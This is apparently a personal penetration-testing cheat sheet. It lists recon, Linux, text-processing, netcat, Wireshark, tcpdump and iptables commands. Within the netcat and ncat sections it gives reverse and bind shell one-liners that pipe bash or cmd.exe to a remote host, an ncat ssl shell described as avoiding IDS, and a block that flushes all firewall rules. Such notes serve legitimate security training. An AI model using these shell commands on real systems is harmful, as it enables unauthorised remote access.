# Personal Methodology

## Information Gathering and Recon

-   Set the Target IP Address to the `$ip` system variable  
    `export ip=192.168.1.100`

> You will use `$ip` in place of the full ip address during the pentest.

-   Find the location of a file  
    `locate sbd.exe`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`

-   Find a search for a file that contains a specific string in it’s
    name:  
    `find / -name sbd\*`

-   Show active internet connections  
    `netstat -lntp`

-   Change Password  
    `passwd`

-   Verify a service is running and listening  
    `netstat -antp |grep apache`

-   Start a service  
    `systemctl start ssh  `
    
    `systemctl start apache2`

-   Have a service start at boot  
    `systemctl enable ssh`

-   Stop a service  
    `systemctl stop ssh`

-   Unzip a gz file  
    `gunzip access.log.gz`

-   Unzip a tar.gz file  
    `tar -xzvf file.tar.gz`

-   Search command history  
    `history | grep phrase_to_search_for`

-   Download a webpage  
    `wget http://www.cisco.com`

-   Open a webpage  
    `curl http://www.cisco.com`

-   String manipulation

    -   Count number of lines in file  
        `wc -l index.html`

    -   Get the start or end of a file  
        `head index.html`
        
        `tail index.html`

    -   Extract all the lines that contain a string  
        `grep "href=" index.html`

    -   Cut a string by a delimiter, filter results then sort  
        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`

    -   Using Grep and regular expressions and output to a file  
        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`

    -   Use a bash loop to find the IP address behind each host  
        `for url in $(cat list.txt); do host $url; done`

    -   Collect all the IP Addresses from a log file and sort by
        frequency  
        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`

-   Decoding using Kali

    -   Decode Base64 Encoded Values
       
        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`

    -   Decode Hexidecimal Encoded Values  
        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`

-   Netcat - Read and write TCP and UDP Packets

    -   Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)

    -   Connect to a POP3 mail server  
        `nc -nv $ip 110`

    -   Listen on TCP/UDP port  
        `nc -nlvp 4444`

    -   Connect to a netcat port  
        `nc -nv $ip 4444`

    -   Send a file using netcat  
        `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`

    -   Receive a file using netcat  
        `nc -nlvp 4444 > incoming.exe`
        
    -   Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
         
            whereis nc
            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz

            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444


    -   Create a reverse shell with Ncat using cmd.exe on Windows  
        `nc.exe -nlvp 4444 -e cmd.exe`
        
        or
        
        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`

    -   Create a reverse shell with Ncat using bash on Linux  
        `nc -nv $ip 4444 -e /bin/bash`
        
    -   Netcat for Banner Grabbing:
    
        `echo "" | nc -nv -w1 <IP Address> <Ports>`

-   Ncat - Netcat for Nmap project which provides more security avoid
    IDS

    -   Reverse shell from windows using cmd.exe using ssl  
        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`

    -   Listen on port 4444 using ssl  
        `ncat -v $ip 4444 --ssl`

-   Wireshark
    -   Show only SMTP (port 25) and ICMP traffic:
    
        `tcp.port eq 25 or icmp`
        
    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
        
        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
        
    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
        
        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
        
    -   Some commands are equal
        
        `ip.addr == xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx `

        ` ip.addr != xxx.xxx.xxx.xxx`
        
         Equals
        
        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`

-   Tcpdump

    -   Display a pcap file  
       `tcpdump -r passwordz.pcap`

    -   Display ips and filter and sort  
        `tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head`

    -   Grab a packet capture on port 80  
        `tcpdump tcp port 80 -w output.pcap -i eth0`

    -   Check for ACK or PSH flag set in a TCP packet  
        `tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap`

-   IPTables 

    -   Deny traffic to ports except for Local Loopback

        `iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP  `
    
        `iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP`

    -   Clear ALL IPTables firewall rules
    
            ```bash
            iptables -P INPUT ACCEPT
            iptables -P FORWARD ACCEPT
            iptables -P OUTPUT ACCEPT
            iptables -t nat -F
            iptables -t mangle -F
            iptables -F
            iptables -X
            iptables -t raw -F iptables -t raw -X
            ```








